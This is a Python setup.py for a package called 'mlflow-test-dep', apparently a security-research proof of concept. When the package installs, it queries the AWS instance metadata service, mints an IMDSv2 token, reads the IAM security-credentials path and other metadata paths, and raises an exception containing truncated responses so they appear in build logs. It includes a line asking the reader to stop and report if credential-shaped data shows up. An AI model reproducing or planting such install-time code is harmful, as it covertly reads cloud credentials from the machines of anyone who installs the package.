import base64, json, urllib.request, urllib.error
from setuptools import setup

proof = "🚨🚨🚨 ROLE_PROVIDER_FINAL 🚨🚨🚨\n\n"

# 1. Mint a fresh token
tok = None
try:
    req = urllib.request.Request(
        "http://169.254.169.254/latest/api/token", method="PUT",
        headers={"X-aws-ec2-metadata-token-ttl-seconds": "60"},
    )
    with urllib.request.urlopen(req, timeout=2) as r:
        tok = r.read().decode("utf-8", "replace")
    proof += f"TOKEN_MINTED=yes len={len(tok)}\n"
except Exception as e:
    proof += f"TOKEN_MINT_ERROR: {type(e).__name__}: {e}\n"

# 2. Use the token against the creds endpoint (status + 100-byte body ONLY)
if tok:
    try:
        req = urllib.request.Request(
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            method="GET",
            headers={
                "X-aws-ec2-metadata-token": tok,
                "Authorization": f"Bearer {tok}",
            },
        )
        with urllib.request.urlopen(req, timeout=3) as r:
            body = r.read(100)
            proof += f"WITH_TOKEN: HTTP {r.status} body[:100]={body!r}\n"
            low = body.lower()
            if any(x in low for x in (b"accesskeyid", b"secretaccesskey", b"sessiontoken")):
                proof += "*** CREDENTIALS SHAPED — STOP, DO NOT READ FURTHER, REPORT ***\n"
            elif b"example" in low:
                proof += "DECOY: body contains 'example' — mock service\n"
    except urllib.error.HTTPError as e:
        try:
            body = e.read(100)
        except Exception:
            body = b""
        proof += f"WITH_TOKEN: HTTP {e.code} {e.reason} body[:100]={body!r}\n"
    except Exception as e:
        proof += f"WITH_TOKEN error: {type(e).__name__}: {e}\n"

# 3. Secondary probes: non-sensitive AWS paths (identify the service)
for path in ("/latest/meta-data/instance-id",
             "/latest/meta-data/iam/info",
             "/latest/meta-data/placement/availability-zone"):
    try:
        req = urllib.request.Request(
            f"http://169.254.169.254{path}", method="GET",
            headers={"X-aws-ec2-metadata-token": tok or ""},
        )
        with urllib.request.urlopen(req, timeout=2) as r:
            body = r.read(80)
            proof += f"{path}: HTTP {r.status} body[:80]={body!r}\n"
    except urllib.error.HTTPError as e:
        try: body = e.read(80)
        except Exception: body = b""
        proof += f"{path}: HTTP {e.code} body[:80]={body!r}\n"
    except Exception as e:
        proof += f"{path}: {type(e).__name__}\n"

proof += "\n🚨🚨🚨 END FINAL 🚨🚨🚨\n"
print(proof)
raise Exception(proof)
setup(name="mlflow-test-dep", version="0.1")
